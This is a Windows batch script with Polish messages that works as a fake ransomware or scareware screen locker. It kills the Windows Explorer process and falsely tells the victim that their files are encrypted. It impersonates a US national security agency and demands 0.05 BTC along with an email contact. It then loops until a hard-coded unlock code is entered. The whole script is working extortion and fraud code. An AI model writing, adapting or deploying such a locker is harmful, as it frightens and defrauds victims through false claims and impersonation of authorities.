@echo off
taskkill /f /im explorer.exe
cls
echo Twoje wazne pliki som zaszyfrowane
echo CYBER.POLICE Amerykanska agencja bezpieczenstwa narodowego
echo Pozostaly czas:                 2-2-21-52
echo Adres Bitcoina:                 Desctyptor-100$32083210.btc
echo Jak dokonac platnosci? Wyslij 0.05 BTC pod adres Descryptor1-100$32083210.btc
echo                                                        0.05 - 500 zl - 50 dolars
echo Po dokonaniu platnosci skontaktuj sie z nami, aby uzyskac odszyfrowanie
echo E-mail:crypt31 w proton dot me
set code=""

:code
set /p code="Wpisz kod tutaj:"
if "%code%"=="5453" goto correct
if NOT "%code%"=="5453" goto wrong

:correct
start explorer
echo Kod jest dobry!
pause
exit

:wrong
echo Kod jest zly:(!
goto code
